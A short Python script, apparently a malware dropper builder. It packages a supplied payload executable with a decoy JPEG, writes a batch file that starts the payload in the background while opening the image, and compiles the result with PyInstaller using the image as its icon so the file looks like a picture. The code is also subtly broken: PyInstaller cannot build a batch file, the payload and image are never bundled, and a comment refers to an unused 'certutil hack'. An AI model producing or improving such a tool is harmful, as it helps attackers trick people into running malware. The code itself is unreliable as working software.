import os
import base64
import shutil
import sys
import tempfile
import subprocess

def create_dropper(image_path, payload_path, output_path):
    # Check if files exist
    if not os.path.isfile(image_path):
        print(f"Image not found: {image_path}")
        return
    if not os.path.isfile(payload_path):
        print(f"Payload not found: {payload_path}")
        return

    # Create a temp folder
    temp_dir = tempfile.mkdtemp()

    # Copy payload
    payload_temp = os.path.join(temp_dir, "payload.exe")
    shutil.copy(payload_path, payload_temp)

    # Copy image
    image_temp = os.path.join(temp_dir, "image.jpg")
    shutil.copy(image_path, image_temp)

    # Create a batch script that:
    # - Runs payload
    # - Opens image
    batch_code = f"""@echo off
start /B "" "%~dp0payload.exe"
start "" "%~dp0image.jpg"
exit
"""
    batch_file = os.path.join(temp_dir, "run.bat")
    with open(batch_file, "w") as f:
        f.write(batch_code)

    # Compile batch to exe (using built-in certutil hack)
    # -> Now, compile this dropper
    print("[*] Creating final executable...")
    subprocess.call(f"pyinstaller --onefile --noconsole --icon={image_path} {batch_file}", shell=True)

    # Move the executable
    dist_path = os.path.join("dist", "run.exe")
    if os.path.exists(dist_path):
        shutil.move(dist_path, output_path)
        print(f"[+] Dropper created: {output_path}")

    # Cleanup
    shutil.rmtree(temp_dir)
    shutil.rmtree("build", ignore_errors=True)
    shutil.rmtree("dist", ignore_errors=True)
    if os.path.exists("run.spec"):
        os.remove("run.spec")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python {sys.argv[0]} <image.jpg> <payload.exe> <output.exe>")
        sys.exit(1)

    img = sys.argv[1]
    payload = sys.argv[2]
    output = sys.argv[3]

    create_dropper(img, payload, output)
